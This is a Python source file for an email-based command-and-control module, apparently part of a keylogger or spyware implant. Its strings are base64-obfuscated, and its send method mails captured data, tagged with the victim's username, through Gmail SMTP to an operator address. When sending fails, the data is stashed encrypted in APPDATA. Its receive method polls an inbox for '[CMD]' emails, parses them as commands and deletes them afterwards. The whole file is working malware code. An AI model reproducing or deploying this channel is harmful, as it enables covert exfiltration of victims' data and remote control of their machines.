import os
import time
import smtplib
import imaplib
import email
import base64

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

import config
from c2 import C2Channel
from obfuscation import deobf
from crypto_utils import encrypt as aes_encrypt, decrypt as aes_decrypt
from log_utils import log

_ESUB = "e30gLSB7fQ=="
_CHNK = "Ci0tLUVORCBPRiBDSFVOSy0tLQo="
_IMAP = "aW1hcC5nbWFpbC5jb20="

from c2.parser import parse_command

def debug_print(msg):
    if config.DEBUG:
        print(msg)

def encrypt_data(data):
    if not config.ENCRYPT_LOGS or not data:
        return data
    return aes_encrypt(data, config.ENCRYPTION_KEY)

def decrypt_data(data):
    if not data:
        return data
    return aes_decrypt(data, config.ENCRYPTION_KEY)

_BACKUP_MAX_BYTES = 5 * 1024 * 1024

def backup_to_file(data):
    try:
        appdata = os.getenv(deobf("QVBQREFUQQ=="))
        backup_path = os.path.join(appdata, config.LOG_FILE_NAME)
        encrypted = encrypt_data(data)
        with open(backup_path, "a") as f:
            f.write(encrypted + deobf(_CHNK))
        try:
            if os.path.getsize(backup_path) > _BACKUP_MAX_BYTES:
                with open(backup_path, "r") as f:
                    lines = f.readlines()
                with open(backup_path, "w") as f:
                    f.writelines(lines[-(len(lines)//2):])
        except Exception:
            pass
    except Exception:
        pass

class EmailC2(C2Channel):
    name = "email"

    def __init__(self):
        self._from = config.EMAIL_SENDER
        self._password = config.EMAIL_PASSWORD
        self._to = config.EMAIL_RECEIVER

    def send(self, payload: dict) -> bool:
        data_str = payload.get("data", "")
        if not data_str or len(data_str.strip()) == 0:
            return True

        retries = 3
        success = False
        user = os.path.expanduser("~").split("\\")[2]

        while retries > 0 and not success:
            try:
                subject = deobf(_ESUB).format(user, time.ctime(time.time()))
                msg = MIMEMultipart()
                msg.set_charset(deobf("dXRmLTg="))
                msg[deobf("RnJvbQ==")] = self._from
                msg[deobf("VG8=")] = self._to
                msg[deobf("U3ViamVjdA==")] = subject
                msg.attach(MIMEText(data_str, deobf("cGxhaW4=")))
                s = smtplib.SMTP_SSL(deobf("c210cC5nbWFpbC5jb20="), 465)
                s.login(self._from, self._password)
                s.sendmail(self._from, self._to, msg.as_string())
                s.quit()
                success = True
            except Exception as e:
                log("warning", f"Email send failed (retries left: {retries-1}): {e}")
                retries -= 1
                time.sleep(5)

        if not success:
            backup_to_file(data_str)

        return success

    def receive(self) -> list:
        commands = []
        try:
            mail = imaplib.IMAP4_SSL(deobf(_IMAP))
            mail.login(self._from, self._password)
            mail.select("INBOX")
            cmd_subject = deobf("W0NNRF0=")
            status, messages = mail.search(None, "UNSEEN", f'SUBJECT "{cmd_subject}"')
            if status == "OK":
                for mid in messages[0].split():
                    fstatus, fdata = mail.fetch(mid, "(RFC822)")
                    if fstatus == "OK":
                        msg = email.message_from_bytes(fdata[0][1])
                        body = ""
                        if msg.is_multipart():
                            for part in msg.walk():
                                if part.get_content_type() == "text/plain":
                                    body = part.get_payload(decode=True).decode("utf-8", errors="replace")
                                    break
                        else:
                            body = msg.get_payload(decode=True).decode("utf-8", errors="replace")
                        if body.strip():
                            commands.extend(parse_command(body.strip()))
                    mail.store(mid, "+FLAGS", "\\Deleted")
                mail.expunge()
            mail.logout()
        except Exception as e:
            log("warning", f"Email receive failed: {e}")
        return commands

    def close(self):
        pass
